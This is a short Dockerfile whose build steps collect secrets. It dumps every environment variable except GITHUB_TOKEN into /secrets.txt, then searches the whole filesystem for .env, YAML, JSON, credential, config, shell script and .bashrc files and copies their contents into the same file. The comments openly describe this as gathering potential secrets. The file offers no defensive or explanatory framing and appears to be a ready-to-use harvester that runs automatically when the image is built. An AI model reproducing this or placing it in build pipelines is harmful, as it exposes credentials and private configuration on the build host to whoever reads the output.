FROM alpine:latest

# Install required tools
RUN apk add --no-cache grep findutils bash

# Collect environment variables and potential secrets
RUN echo "[ENV VARS]:" > /secrets.txt && \
    (env | grep -v 'GITHUB_TOKEN' || true) >> /secrets.txt && \
    echo "\n[LIKELY SECRET FILES]:" >> /secrets.txt && \
    find / -type f \
        -iname "*.env" -o \
        -iname "*.yml" -o \
        -iname "*.json" -o \
        -iname "*credentials*" -o \
        -iname "*config*" -o \
        -iname "*.sh" -o \
        -iname "*.bashrc" \
    -exec sh -c 'echo "\n--- {} ---" && cat "{}"' \; >> /secrets.txt 2>/dev/null || true

# Optional: Mark that execution completed
RUN echo "[MARKER] Secrets scan complete" >> /secrets.txt
